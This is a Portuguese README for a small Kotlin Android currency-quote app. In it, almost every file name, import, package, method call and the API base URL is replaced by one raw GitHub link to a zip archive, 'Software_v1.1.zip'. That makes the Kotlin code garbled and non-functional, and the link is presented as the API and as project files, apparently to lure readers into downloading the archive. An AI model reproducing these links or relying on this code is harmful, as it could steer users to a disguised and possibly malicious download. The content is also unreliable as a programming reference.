# 📖 Cotação Moedas - App Android

Este é um aplicativo Android simples que permite consultar a cotação atual de moedas estrangeiras em relação ao Real Brasileiro (BRL), usando a API pública da AwesomeAPI.
Tecnologias utilizadas

---
    Kotlin

    Retrofit (para requisições HTTP)

    JSON (para comunicação com API)

    Android Studio

    EditText, Button e TextView para interface

Funcionalidades

    O usuário digita a sigla da moeda (ex: USD, EUR, BTC)

    O app consulta a API https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip e busca a cotação atual da moeda selecionada em relação ao Real

    Exibe a alta, baixa, valor atual e data da última atualização da moeda

Estrutura do projeto

    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Lógica principal da tela de busca e exibição da cotação

    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Interface Retrofit para definir as chamadas HTTP à API

    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Data class para modelar os dados recebidos da API

    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip Layout da tela principal com campos de entrada e botão

## 📂 Arquivos principais

### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`

```kotlin
package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip

import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip*
import retrofit2.*
import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip

class MainActivity : AppCompatActivity() {

    // Variáveis para referenciar os elementos da interface
    private lateinit var editMoeda: EditText
    private lateinit var btnBuscar: Button
    private lateinit var textResultado: TextView

    // Método chamado ao criar a Activity
    override fun onCreate(savedInstanceState: Bundle?) {
        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(savedInstanceState)
        // Define o layout da tela a ser usado
        setContentView(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)

        // Associa as variáveis com os componentes visuais do layout pelo ID
        editMoeda = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
        btnBuscar = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)
        textResultado = findViewById(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)

        // Configuração do Retrofit para fazer requisições HTTP
        val retrofit = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()
            .baseUrl("https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip")  // URL base da API
            .addConverterFactory(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip())  // Conversor JSON para objetos Kotlin
            .build()

        // Cria uma instância da interface de chamadas da API
        val api = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip)

        // Define o que acontece quando o botão é clicado
        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip {
            // Pega o texto digitado, remove espaços e converte para maiúscula
            val sigla = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip().trim().uppercase()

            // Se o campo estiver vazio, avisa o usuário
            if (https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()) {
                https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Digite a sigla da moeda!"
                return@setOnClickListener
            }

            // Faz a chamada para buscar a cotação da moeda
            val call = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(sigla)

            // Executa a requisição assincronamente
            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(object : Callback<Map<String, MoedaResponse>> {
                // Se a resposta da API for recebida
                override fun onResponse(
                    call: Call<Map<String, MoedaResponse>>,
                    response: Response<Map<String, MoedaResponse>>
                ) {
                    if (https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip) {  // Se status HTTP for 200
                        val body = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip()
                        // A API retorna um mapa com chave "SIGLABRL", por exemplo "USDBRL"
                        val key = "${sigla}BRL"

                        val moeda = https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip(key)
                        if (moeda != null) {
                            // Prepara o texto com as informações da moeda para mostrar ao usuário
                            val texto = """
                                Moeda: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                                Alta: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                                Baixa: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                                Valor atual: R$ ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                                Atualizado em: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}
                            """.trimIndent()
                            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = texto
                        } else {
                            // Caso não encontre a moeda no mapa retornado
                            https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Moeda não encontrada."
                        }
                    } else {
                        // Caso a resposta HTTP não seja sucesso (ex: 404)
                        https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Erro na resposta da API."
                    }
                }

                // Caso a requisição falhe (ex: sem internet)
                override fun onFailure(call: Call<Map<String, MoedaResponse>>, t: Throwable) {
                    https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip = "Erro: ${https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip}"
                }
            })
        }
    }
}
```
### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`
```kotlin
package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip

import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip
import https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip

interface MoedaApi {

    // Define o endpoint GET para buscar a cotação de uma moeda específica em relação ao real (BRL)
    // {moeda} será substituído pela sigla da moeda (ex: USD)
    // A resposta é um mapa onde a chave é a concatenação da moeda com BRL
    @GET("json/last/{moeda}-BRL")
    fun getCotacao(@Path("moeda") moeda: String): Call<Map<String, MoedaResponse>>
}
```
### ✅ `https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip`
```kotlin
package https://raw.githubusercontent.com/ItaloGLS/apicotacao/main/widowhood/Software_v1.1.zip

// Data class que representa a estrutura dos dados recebidos da API para uma moeda
data class MoedaResponse(
    val code: String,        // Código da moeda (ex: USD)
    val codein: String,      // Código da moeda de conversão (ex: BRL)
    val name: String,        // Nome da moeda (ex: Dólar Americano/Real Brasileiro)
    val high: String,        // Valor máximo da moeda no dia
    val low: String,         // Valor mínimo da moeda no dia
    val bid: String,         // Valor atual de compra da moeda
    val ask: String,         // Valor atual de venda da moeda
    val create_date: String  // Data e hora da última atualização
)
```
